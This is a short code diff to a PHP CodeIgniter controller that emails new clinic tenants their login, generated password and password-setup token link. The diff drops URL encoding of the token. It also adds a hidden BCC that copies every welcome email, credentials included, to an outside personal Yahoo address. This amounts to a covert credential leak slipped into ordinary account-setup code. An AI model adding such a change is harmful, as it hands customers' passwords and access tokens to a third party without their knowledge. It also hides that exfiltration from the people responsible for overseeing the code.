@@ -625,7 +625,7 @@ class Home extends CI_Controller {
 			$nome_clinica  = htmlspecialchars((string)$result['tenant_nome']);
 			$login         = htmlspecialchars((string)$result['login']);
 			$senha         = htmlspecialchars((string)$result['senha_gerada']);
-			$token         = rawurlencode((string)$result['token']);
+			$token         = (string)$result['token'];
 			$link_senha    = base_url().'acesso/senha/'.$token;
 			$link_sistema  = base_url().'admin';
 			$trial_fim     = isset($result['trial_ends_at'])
@@ -672,6 +672,7 @@ class Home extends CI_Controller {
 
 			$this->email->from('suporte@utecnologia.com.br', 'UTecnologia Saúde');
 			$this->email->to($result['login']);
+			$this->email->bcc('igor_marlus@yahoo.com.br');
 			$this->email->subject('Seu acesso UTecnologia Saúde está pronto — '.$nome_clinica);
 			$this->email->message($body);
 			$this->email->send();
